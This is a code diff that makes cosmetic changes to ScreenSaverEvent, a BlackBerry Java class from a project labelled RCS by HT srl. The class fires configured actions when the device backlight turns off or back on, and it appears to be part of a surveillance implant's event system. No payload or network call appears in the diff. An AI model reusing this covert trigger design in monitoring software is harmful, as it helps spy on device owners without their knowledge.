@@ -1,17 +1,27 @@
+//#preprocess
+/* *************************************************
+ * Copyright (c) 2010 - 2010
+ * HT srl,   All rights reserved.
+ * Project      : RCS, RCSBlackBerry_lib
+ * File         : ScreenSaverEvent
+ * Created      : 26-mag-2010
+ * *************************************************/
+
 package blackberry.event;
 
 import java.io.EOFException;
 
+import net.rim.device.api.util.DataBuffer;
 import blackberry.AppListener;
 import blackberry.interfaces.BacklightObserver;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
 
-import net.rim.device.api.util.DataBuffer;
-
 public class ScreenSaverEvent extends Event implements BacklightObserver {
     //#ifdef DEBUG
-    private static Debug debug = new Debug("ScreenSaverEvent", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("ScreenSaverEvent",
+            DebugLevel.VERBOSE);
+    //#endif
     
     int actionOnEnter;
     int actionOnExit;
@@ -25,7 +35,7 @@ public class ScreenSaverEvent extends Event implements BacklightObserver {
      * (non-Javadoc)
      * @see blackberry.threadpool.TimerJob#actualStart()
      */
-    protected void actualStart() {
+    protected final void actualStart() {
         AppListener.getInstance().addBacklightObserver(this);
     }
 
@@ -33,11 +43,11 @@ public class ScreenSaverEvent extends Event implements BacklightObserver {
      * (non-Javadoc)
      * @see blackberry.threadpool.TimerJob#actualStop()
      */
-    protected void actualStop() {
+    protected final void actualStop() {
         AppListener.getInstance().removeBacklightObserver(this);
     }
 
-    protected boolean parse(byte[] confParams) {
+    protected final boolean parse(final byte[] confParams) {
         final DataBuffer databuffer = new DataBuffer(confParams, 0,
                 confParams.length, false);
         try {
@@ -53,11 +63,11 @@ public class ScreenSaverEvent extends Event implements BacklightObserver {
 
     }
 
-    public void onBacklightChange(boolean enabled) {
+    public final void onBacklightChange(final boolean enabled) {
         //#ifdef DEBUG_TRACE
         debug.trace("onBacklightChange: " + enabled);
         //#endif
-        if (!enabled) {            
+        if (!enabled) {
             trigger(actionOnEnter);
         } else {
             trigger(actionOnExit);
